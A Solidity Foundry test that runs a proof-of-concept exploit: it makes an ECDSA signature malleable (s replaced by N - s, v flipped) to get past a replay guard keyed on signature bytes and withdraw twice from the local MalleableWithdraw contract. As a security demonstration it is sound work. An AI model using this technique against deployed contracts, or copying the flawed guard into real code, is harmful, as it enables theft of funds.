// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {MalleableWithdraw} from "../src/MalleableWithdraw.sol";

contract MalleabilityExploitTest is Test {
    MalleableWithdraw target;
    uint256 ownerPk = 0xA11CE;
    address owner;
    address attacker = makeAddr("attacker");

    // secp256k1 curve order — a fixed, public constant, not a secret
    uint256 constant N = 115792089237316195423570985008687907852837564279074904382605163141518161494337;

    function setUp() public {
        owner = vm.addr(ownerPk);
        target = new MalleableWithdraw{value: 10 ether}(owner);
    }

    function test_exploit_malleableSignatureBypassesReplayGuard() public {
        uint256 amount = 1 ether;
        bytes32 messageHash = keccak256(abi.encodePacked(attacker, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, messageHash);

        // --- First withdrawal: the original, legitimately-signed request ---
        target.withdraw(attacker, amount, v, r, s);
        assertEq(attacker.balance, amount);
        console.log("First withdrawal succeeded. Attacker balance:", attacker.balance);

        // --- Compute the malleable counterpart: flip s to (n - s), flip v accordingly ---
        uint256 sFlipped = N - uint256(s);
        uint8 vFlipped = v == 27 ? 28 : 27; // flipping s always flips the corresponding v

        // Prove this is a DIFFERENT set of bytes — the replay guard sees it as "unused"
        bytes32 originalSigHash = keccak256(abi.encodePacked(v, r, s));
        bytes32 flippedSigHash = keccak256(abi.encodePacked(vFlipped, r, bytes32(sFlipped)));
        assertTrue(originalSigHash != flippedSigHash);

        // Prove ecrecover still resolves to the SAME signer for the SAME message
        address recoveredFromFlipped = ecrecover(messageHash, vFlipped, r, bytes32(sFlipped));
        assertEq(recoveredFromFlipped, owner);
        console.log("Flipped signature still recovers to owner:", recoveredFromFlipped == owner);

        // --- Second "withdrawal": same message, same signer, different signature bytes ---
        target.withdraw(attacker, amount, vFlipped, r, bytes32(sFlipped));

        assertEq(attacker.balance, amount * 2); // drained twice from what was meant to be ONE authorization
        console.log("Second withdrawal (malleable) succeeded. Attacker balance:", attacker.balance);
    }
}